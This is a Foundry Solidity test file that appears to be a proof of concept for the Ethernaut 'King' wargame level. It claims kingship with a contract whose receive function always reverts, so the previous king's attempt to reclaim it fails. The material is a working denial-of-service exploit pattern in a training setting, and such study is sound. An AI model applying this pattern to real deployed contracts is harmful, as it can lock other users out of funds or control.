// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {King} from "../src/King.sol";

contract King_POC is Test {
    King _king;
    function init() private{
        payable(address(0x10)).transfer(1 ether);
        vm.startPrank(address(0x10));
        _king = new King{value:1}();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_King_POC() public{
        payable(address(_king)).call{value:2}("");

        //模拟合约部署则重新尝试获取king
        vm.startPrank(address(0x10));
        payable(address(_king)).call{value:3}("");
        vm.stopPrank();

        console.log("Success:",_king._king()==address(this));
    }

    receive() external payable {
        revert();
    }
}

